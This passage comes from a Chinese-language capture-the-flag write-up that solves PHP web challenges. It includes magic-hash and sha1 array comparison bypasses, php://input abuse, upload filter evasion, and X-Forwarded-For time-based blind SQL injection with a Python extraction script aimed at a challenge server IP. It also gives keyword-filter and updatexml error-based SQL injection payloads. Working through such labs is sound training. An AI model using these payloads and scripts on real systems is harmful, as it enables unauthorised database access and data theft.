<span class="hljs-variable">$a</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];
<span class="hljs-variable">$md52</span> = @md5(<span class="hljs-variable">$a</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="hljs-variable">$md51</span> == <span class="hljs-variable">$md52</span>) &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nctf&#123;*****************&#125;&quot;</span>;
&#125; <span class="hljs-keyword">else</span> &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;false!!!&quot;</span>;
&#125;&#125;
<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please input a&quot;</span>;&#125;</code></pre>

<p>即使用get方式传递一个参数a,使得a的值不等于<code>QNKCDZO</code>但是二者的md5值相同</p>
<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
<p>常见的payload有</p>
<pre><code class="hljs stylus">QNKCDZO
<span class="hljs-number">240610708</span>
s878926199a
s155964671a
s214587387a
s214587387a
 sha1(str)
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aaroZmOk&#x27;</span>)</span></span>  
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aaK1STfY&#x27;</span>)</span></span>
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aaO8zKZF&#x27;</span>)</span></span>
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aa3OFF9m&#x27;</span>)</span></span></code></pre>



<h2 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h2><p>见到题目就想到了<code>x-forwarded-for</code>，本地地址可以使用IP:127.0.0.1</p>
<p>可以使用google浏览器的插件<img src="https://i.loli.net/2020/11/30/idlumxHC5tWKwvI.png" alt></p>
<p><img src="https://i.loli.net/2020/11/30/jswkU98VvSIgEJK.png" alt></p>
<p><img src="https://i.loli.net/2020/11/30/gE2JADOYGnLIloj.png" alt></p>
<h2 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h2><p>题目源码</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);
<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);
<span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;uname&#x27;</span>] == <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])

        <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;passwd can not be uname.&#x27;</span>;

    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]) === sha1(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])&amp;(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]==<span class="hljs-string">&#x27;margin&#x27;</span>))

        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);

    <span class="hljs-keyword">else</span>

        <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;sorry!&#x27;</span>;

&#125;
<span class="hljs-meta">?&gt;</span></code></pre>

<p>首先看一下要传入哪些变量</p>
<p>get:id uname</p>
<p>post:passwd</p>
<p>id需要进行一次urldecode，解码的值为margin</p>
<p>uname与passwd不相同，但是sha1值要相同，并且是严格相等 ===，这里可以使用sha1函数的漏洞，无法处理数组类型的变量，最后会返回0，也可以用sha1强碰撞。</p>
<p>payload</p>
<pre><code class="hljs apache"><span class="hljs-attribute">urlencode</span>(margin)=%<span class="hljs-number">6</span>D%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>E
<span class="hljs-attribute">uname</span>[]=<span class="hljs-number">1</span>
<span class="hljs-attribute">passwd</span>[]=<span class="hljs-number">2</span>

<span class="hljs-attribute">GET</span>: id=%<span class="hljs-number">6</span>D%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>E&amp;uname[]=<span class="hljs-number">1</span>
<span class="hljs-attribute">POST</span>:passwd[]=<span class="hljs-number">2</span></code></pre>

<p><img src="https://i.loli.net/2020/11/23/MPLxeWwG2BIYHbf.png" alt></p>
<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
extract(<span class="hljs-variable">$_GET</span>);
<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$ac</span>))
&#123;
<span class="hljs-variable">$f</span> = trim(file_get_contents(<span class="hljs-variable">$fn</span>));
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$ac</span> === <span class="hljs-variable">$f</span>)
&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;This is flag:&quot;</span> .<span class="hljs-string">&quot; <span class="hljs-subst">$flag</span>&lt;/p&gt;&quot;</span>;
&#125;
<span class="hljs-keyword">else</span>
&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;</span>;
&#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>

<p><strong>extract</strong>函数作用</p>
<p>(PHP 4, PHP 5, PHP 7)</p>
<p>extract — 从数组中将变量导入到当前的符号表</p>
<p>说明</p>
<p>extract ( array <code>&amp;$array</code> [, int <code>$flags</code> = EXTR_OVERWRITE [, string <code>$prefix</code> = <strong><code>NULL</code></strong> ]] ) : int</p>
<p>本函数用来将变量从数组中导入到当前的符号表中。</p>
<p>检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。</p>
<p><strong>trim</strong></p>
<p>(PHP 4, PHP 5, PHP 7)</p>
<p>trim — 去除字符串首尾处的空白字符（或者其他字符）</p>
<p>说明</p>
<p>trim ( string <code>$str</code> [, string <code>$character_mask</code> = “ \t\n\r\0\x0B” ] ) : string</p>
<p>此函数返回字符串 <code>str</code> 去除首尾空白字符后的结果。如果不指定第二个参数，<strong>trim()</strong> 将去除这些字符：</p>
<ul>
<li>“ “ (ASCII <code>32</code> (<code>0x20</code>))，普通空格符。</li>
<li>“\t” (ASCII <code>9</code> (<code>0x09</code>))，制表符。</li>
<li>“\n” (ASCII <code>10</code> (<code>0x0A</code>))，换行符。</li>
<li>“\r” (ASCII <code>13</code> (<code>0x0D</code>))，回车符。</li>
<li>“\0” (ASCII <code>0</code> (<code>0x00</code>))，空字节符。</li>
<li>“\x0B” (ASCII <code>11</code> (<code>0x0B</code>))，垂直制表符。</li>
</ul>
<p><strong>file_get_contents</strong></p>
<p>(PHP 4 &gt;= 4.3.0, PHP 5, PHP 7)</p>
<p>file_get_contents — 将整个文件读入一个字符串</p>
<p>代码的大致含义就是</p>
<p>get方式提交参数，用extract函数将变量写入符号表中，如果get提交的参数中包含$ac，则利用file_get_content函数从文件中读取内容并赋值给$f,如果$ac===$f则拿到flag</p>
<p>这里需要利用php的伪协议写入内容 php://input</p>
<p>payload</p>
<pre><code class="hljs dts"><span class="hljs-symbol">GET:</span> ac=<span class="hljs-number">111</span><span class="hljs-variable">&amp;fn</span>=php:<span class="hljs-comment">//input</span>
<span class="hljs-symbol">POST:</span> <span class="hljs-number">111</span></code></pre>



<h2 id="细心"><a href="#细心" class="headerlink" title="细心"></a>细心</h2><p>题目网站崩了</p>
<h2 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h2><p>文件上传</p>
<p>首先先上传一个图片文件，上传成功了并返回保存路径</p>
<p>再上传一个php的文件，提示<code>Invalid file</code></p>
<p>上传.htaccess, .user.ini都提示<code>you got it</code></p>
<p>两种提示不一样猜测可能存在后缀黑名单和文件类型检测。</p>
<p>上传一个php5文件并bp抓包修改MIME(Content-Type)为 image/.jpeg还是提示invalid file </p>
<p><img src="https://i.loli.net/2020/11/23/FgbfWmJIoNxpw7V.png" alt="getshell1.png"></p>
<p>再修改请求头部的Content-Type，利用大小写绕过，成功拿到flag</p>
<p><img src="https://i.loli.net/2020/11/23/w2bYAuHngShyXCI.png" alt="getshell2.png"></p>
<p>考察知识点：</p>
<p><strong>请求中的Content-Type</strong></p>
<p>在请求中 (如POST 或 PUT)，Content-Type字段用于客户端告诉服务器实际发送的数据类型。当你发送一个HTTP的POST请求时，需要设置请求头中的Content-Type字段，告诉服务端你发送的数据是什么类型的。</p>
<p><strong>设置请求头中的Content-Type</strong></p>
<p>当客户端向服务端发起HTTP的POST请求时，需要告诉服务端，我们发送的数据类型，方便服务端去解析数据。如果你不设置，那么服务端可能无法处理你的请求。</p>
<h2 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a>INSERT INTO注入</h2><p>提示了insert into注入</p>
<p>并给出了源码</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getIp</span>(<span class="hljs-params"></span>)</span>&#123;
<span class="hljs-variable">$ip</span> = <span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]))&#123; <span class="hljs-comment">//判断是否存在xxf</span>
<span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];		<span class="hljs-comment">//存在则优先使用xxf</span>
&#125;<span class="hljs-keyword">else</span>&#123;
<span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];				<span class="hljs-comment">//remote_addr	</span>
&#125;
<span class="hljs-variable">$ip_arr</span> = explode(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$ip</span>);				<span class="hljs-comment">//过滤 ,</span>
<span class="hljs-keyword">return</span> <span class="hljs-variable">$ip_arr</span>[<span class="hljs-number">0</span>];

&#125;

<span class="hljs-variable">$host</span>=<span class="hljs-string">&quot;localhost&quot;</span>;
<span class="hljs-variable">$user</span>=<span class="hljs-string">&quot;&quot;</span>;
<span class="hljs-variable">$pass</span>=<span class="hljs-string">&quot;&quot;</span>;
<span class="hljs-variable">$db</span>=<span class="hljs-string">&quot;&quot;</span>;

<span class="hljs-variable">$connect</span> = mysql_connect(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to connect&quot;</span>);<span class="hljs-comment">//连接数据库</span>

mysql_select_db(<span class="hljs-variable">$db</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to select database&quot;</span>);

<span class="hljs-variable">$ip</span> = getIp();
<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;your ip is :&#x27;</span>.<span class="hljs-variable">$ip</span>;
<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;insert into client_ip (ip) values (&#x27;<span class="hljs-subst">$ip</span>&#x27;)&quot;</span>; <span class="hljs-comment">//注入点</span>
mysql_query(<span class="hljs-variable">$sql</span>);
<span class="hljs-meta">?&gt;</span></code></pre>

<p>网页显示出自己的ip地址，想到的是xff头，修改了xff头的内容后，页面回显也会改变，所以就是xff注入。</p>
<p>抓包添加xxf头，并构造注入语句,这里因为过滤了逗号，所以无法使用if语句，又因为没有回显所以要使用基于时间的盲注</p>
<pre><code class="hljs awk"><span class="hljs-variable">$ip_arr</span> = explode(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$ip</span>);   <span class="hljs-regexp">//</span>过滤了,</code></pre>

<p>代替if的注入语句如下</p>
<pre><code class="hljs ada"><span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> 语句<span class="hljs-number">1</span> <span class="hljs-keyword">then</span> 语句<span class="hljs-number">2</span> <span class="hljs-keyword">else</span> 语句<span class="hljs-number">3</span> <span class="hljs-keyword">end</span>;
//含义很好理解，就是当语句<span class="hljs-number">1</span>为真时，执行语句<span class="hljs-number">2</span>，否则执行语句<span class="hljs-number">3</span></code></pre>

<p>所以要构造的注入语句为</p>
<pre><code class="hljs n1ql">11&#x27;+(<span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> <span class="hljs-built_in">length</span>(<span class="hljs-keyword">database</span>())=<span class="hljs-number">5</span> <span class="hljs-keyword">then</span> sleep(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>))%<span class="hljs-number">23</span>
//当数据库名的长度为<span class="hljs-number">5</span>时，则执行sleep(<span class="hljs-number">5</span>)，否则结束，这样就可以根据网页的响应时间来判断查询语句是否正确</code></pre>

<p>带入原语句</p>
<pre><code class="hljs n1ql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> client_ip (ip) <span class="hljs-keyword">values</span> (<span class="hljs-string">&#x27;$ip&#x27;</span>)
<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> client_ip (ip) <span class="hljs-keyword">values</span> (<span class="hljs-string">&#x27;11&#x27;</span>+(<span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> <span class="hljs-built_in">length</span>(<span class="hljs-keyword">database</span>())=<span class="hljs-number">5</span> <span class="hljs-keyword">then</span> sleep(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>))%<span class="hljs-number">23</span>
//可以看到语句成功注入到原查询语句中，并可以正常执行</code></pre>

<p>判断字段每一个字符的值</p>
<p>常用的语句应该为</p>
<pre><code class="hljs ada"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> (<span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> (substr(<span class="hljs-keyword">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;c&#x27;</span> <span class="hljs-keyword">then</span> sleep(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">1</span> <span class="hljs-keyword">end</span>) #</code></pre>

<p>但是因为逗号被过滤了，所以改为下面的语句</p>
<pre><code class="hljs ada"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> (<span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> (substr(<span class="hljs-keyword">select</span> database()) from <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;c&#x27;</span> <span class="hljs-keyword">then</span> sleep(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">1</span> <span class="hljs-keyword">end</span>) #</code></pre>



<pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span>
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> sys
<span class="hljs-comment">#sql = &#x27;127.0.0.1&#x27;+(select case when substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from &#123;0&#125; for 1)=&#x27;&#123;1&#125;&#x27;) then sleep(5) else 0 end) --+</span>

<span class="hljs-comment">##client_ip,flag</span>

<span class="hljs-comment">#sql = &#x27;127.0.0.1&#x27;+(select case when substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; from &#123;0&#125; for 1)=&#x27;&#123;1&#125;&#x27;) then sleep(5) else 0 end) --+</span>

sql = <span class="hljs-string">&quot;127.0.0.1&#x27;+(select case when substr((select flag from flag) from &#123;0&#125; for 1)=&#x27;&#123;1&#125;&#x27; then sleep(5) else 0 end))-- +&quot;</span>
url = <span class="hljs-string">&#x27;http://123.206.87.240:8002/web15/&#x27;</span>
flag = <span class="hljs-string">&#x27;&#x27;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">40</span>):
    print(<span class="hljs-built_in">str</span>(i))
    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">129</span>):
        <span class="hljs-keyword">if</span> ch == <span class="hljs-number">128</span>:
            sys.exit(<span class="hljs-number">0</span>)
        sqli = sql.<span class="hljs-built_in">format</span>(i, <span class="hljs-built_in">chr</span>(ch))
        header = &#123;
            <span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: sqli
        &#125;
        <span class="hljs-keyword">try</span>:
            html = requests.get(url, headers=header, timeout=<span class="hljs-number">3</span>) <span class="hljs-comment">#响应时间超过3秒则 进入except 即可猜测是正确的</span>
        <span class="hljs-keyword">except</span>:
            flag += <span class="hljs-built_in">chr</span>(ch)
            print(flag)
            <span class="hljs-keyword">break</span></code></pre>



<h2 id="这是一个神奇的登陆框"><a href="#这是一个神奇的登陆框" class="headerlink" title="这是一个神奇的登陆框"></a>这是一个神奇的登陆框</h2><p>网址打不开</p>
<h2 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h2><p>tips</p>
<blockquote>
<p>本题有2个flag<br>flag均为小写<br>flag格式 flag{}</p>
</blockquote>
<p>看到题目提示，应该是二次注入</p>
<p>url中存在id参数，再id参数后加 ‘后页面报错，再加上#后显示 <code>There is nothing</code></p>
<p>输入 id=1’or 1=1–+ 报错</p>
<p>但是输入id=1’oorr 1=1–+ 时正常了，说明存在关键词过滤，通过异或注入发现过滤了union,select,and,or等关键词，可以用双写绕过。</p>
<pre><code class="hljs matlab"><span class="hljs-number">1</span>&#x27;^(<span class="hljs-built_in">length</span>(<span class="hljs-string">&#x27;union&#x27;</span>)!=<span class="hljs-number">0</span>)--+
页面显示错误正常说明<span class="hljs-built_in">length</span>(<span class="hljs-string">&#x27;union&#x27;</span>)!=<span class="hljs-number">0</span>是错的，即<span class="hljs-built_in">length</span>(<span class="hljs-string">&#x27;union&#x27;</span>)=<span class="hljs-number">0</span>，说明union替换为空了
其他关键词的测试也类似</code></pre>

<p>开始注入</p>
<pre><code class="hljs pgsql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+</span>
<span class="hljs-string"></span>
<span class="hljs-string">database:flag1,hint</span>
<span class="hljs-string"></span>
<span class="hljs-string">-1&#x27;</span> ununionion seselectlect <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> infoorrmation_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;flag1&#x27;</span><span class="hljs-comment">--+</span>
<span class="hljs-keyword">table</span>:flag1,address
<span class="hljs-number">-1</span><span class="hljs-string">&#x27; ununionion seselectlect 1,group_concat(flag1) from flag1 --+</span>
<span class="hljs-string">usOwycTju+FTUUzXosjr 解码为：好吧你会SQL注入</span>
<span class="hljs-string">-1&#x27;</span> ununionion seselectlect <span class="hljs-number">1</span>,group_concat(address) <span class="hljs-keyword">from</span> flag1 <span class="hljs-comment">--+</span>
拿到下一关的地址
</code></pre>

<p><img src="https://i.loli.net/2020/11/23/uMT6Q7oaNHJEcbv.png" alt="sqls-1.png"></p>
<p>同样存在一个注入点id，加单引号发现提示了报错信息，很明显是报错注入</p>
<p><img src="https://i.loli.net/2020/11/23/KBepFMZsYRPHaW8.png" alt="sqls-2.png"></p>
<p>报错注入一般是固定的模板</p>
<p>下面使用updatexml()进行注入</p>
<blockquote>
<p>函数语法：updatexml(XML_document, XPath_string, new_value);</p>
<p>适用版本: 5.1.5+<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p>
<p>我们通常在第二个xpath参数填写我们要查询的内容。</p>
</blockquote>
<p>payload</p>
<pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(&#x27;</span>~<span class="hljs-string">&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#x27;</span>~<span class="hljs-string">&#x27;),3) %23</span>
<span class="hljs-string">database:~class,flag2~</span>
<span class="hljs-string"> </span>
<span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;flag2&#x27;</span>),<span class="hljs-string">&#x27;~&#x27;</span>),<span class="hljs-number">3</span>) %<span class="hljs-number">23</span>
<span class="hljs-keyword">table</span>:~flag2,address~
# 查数据
?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(&#x27;</span><span class="hljs-number">0x7e</span><span class="hljs-string">&#x27;,(select flag2 from flag2),&#x27;</span><span class="hljs-number">0x7e</span><span class="hljs-string">&#x27;),3) %23</span>
<span class="hljs-string"> 拿到真正的flag</span></code></pre>

<p><img src="https://i.loli.net/2020/11/23/QwtPgsAriuMOGLB.png" alt="sqls-flag.png"></p>
<h2 id="PHP-encrypt-1-ISCCCTF"><a href="#PHP-encrypt-1-ISCCCTF" class="headerlink" title="PHP_encrypt_1(ISCCCTF)"></a>PHP_encrypt_1(ISCCCTF)</h2><p>题目给了源码分析可知是一个加密过程，并且给了加密后的字符串，所以写出解密脚本即可</p>
<p>加密后的数据为</p>
<pre><code class="hljs abnf"><span class="hljs-attribute">fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA</span>=</code></pre>

<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span></span>)</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-variable">$key</span> = md5(<span class="hljs-string">&#x27;ISCC&#x27;</span>);
    <span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>;
    <span class="hljs-variable">$len</span> = strlen(<span class="hljs-variable">$data</span>);
    <span class="hljs-variable">$klen</span> = strlen(<span class="hljs-variable">$key</span>);
    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len</span>; <span class="hljs-variable">$i</span>++) &#123; 
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$x</span> == <span class="hljs-variable">$klen</span>)
        &#123;
            <span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>;
        &#125;
        <span class="hljs-variable">$char</span> .= <span class="hljs-variable">$key</span>[<span class="hljs-variable">$x</span>];
        <span class="hljs-variable">$x</span>+=<span class="hljs-number">1</span>;
    &#125;
    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len</span>; <span class="hljs-variable">$i</span>++) &#123;
        <span class="hljs-variable">$str</span> .= chr((ord(<span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>]) + ord(<span class="hljs-variable">$char</span>[<span class="hljs-variable">$i</span>])) % <span class="hljs-number">128</span>);
    &#125;
    <span class="hljs-keyword">return</span> base64_encode(<span class="hljs-variable">$str</span>);
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>

<p>解密脚本如下</p>
<pre><code class="hljs php">

<span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-variable">$key</span> = md5(<span class="hljs-string">&#x27;ISCC&#x27;</span>);  <span class="hljs-comment">// 对密钥进行md5加密</span>
    <span class="hljs-variable">$x</span>=<span class="hljs-number">0</span>;
    <span class="hljs-variable">$str</span>=base64_decode(<span class="hljs-variable">$str</span>); <span class="hljs-comment">//对加密后的字符串base64解码</span>
    <span class="hljs-variable">$len</span>=strlen(<span class="hljs-variable">$str</span>);     
    <span class="hljs-variable">$klen</span>=strlen(<span class="hljs-variable">$key</span>);

    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$len</span>;<span class="hljs-variable">$i</span>++)   <span class="hljs-comment">//计算出char字符数组，用于最后的减操作</span>
    &#123;
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>==<span class="hljs-variable">$klen</span>)
        &#123;
            <span class="hljs-variable">$x</span>=<span class="hljs-number">0</span>;
        &#125;
        <span class="hljs-variable">$char</span>.=<span class="hljs-variable">$key</span>[<span class="hljs-variable">$x</span>];
        <span class="hljs-variable">$x</span>+=<span class="hljs-number">1</span>;
    &#125;
    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$len</span>;<span class="hljs-variable">$i</span>++)
    &#123;
        <span class="hljs-variable">$data</span>.=chr((ord(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$i</span>])-ord(<span class="hljs-variable">$char</span>[<span class="hljs-variable">$i</span>])+<span class="hljs-number">128</span>)%<span class="hljs-number">128</span>);  <span class="hljs-comment">//加上128为了防止出现负数。</span>
    &#125;
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;
&#125;
<span class="hljs-keyword">echo</span>(decode(<span class="hljs-string">&#x27;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=&#x27;</span>));
<span class="hljs-meta">?&gt;</span>
</code></pre>

<p><img src="https://i.loli.net/2020/11/23/DEs3N8y7ngdKovb.png" alt="encode.png"></p>
<h2 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h2><p>网址打不开</p>
<h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>给了提示hint，猜测可能是要提交的参数，get提交hint,显示源码</p>
<pre><code class="hljs php+HTML">&lt;?php
error_reporting(0);
include_once(&quot;flag.php&quot;);
$cookie &#x3D; $_COOKIE[&#39;ISecer&#39;];  &#x2F;&#x2F;含cookie 可能需要抓包修改cookie
if(isset($_GET[&#39;hint&#39;]))&#123;
    show_source(__FILE__);
&#125;
elseif (unserialize($cookie) &#x3D;&#x3D;&#x3D; &quot;$KEY&quot;) &#x2F;&#x2F;如果反序列化后的$cookie&#x3D;&#x3D;&#x3D;$KEY 拿到flag
&#123;                                           
    echo &quot;$flag&quot;;
&#125;
else &#123;
?&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;
&lt;title&gt;Login&lt;&#x2F;title&gt;
&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;admin.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;
&lt;&#x2F;head&gt;
&lt;body&gt;
&lt;br&gt;
&lt;div class&#x3D;&quot;container&quot; align&#x3D;&quot;center&quot;&gt;
  &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;#&quot;&gt;
    &lt;p&gt;&lt;input name&#x3D;&quot;user&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Username&quot;&gt;&lt;&#x2F;p&gt;
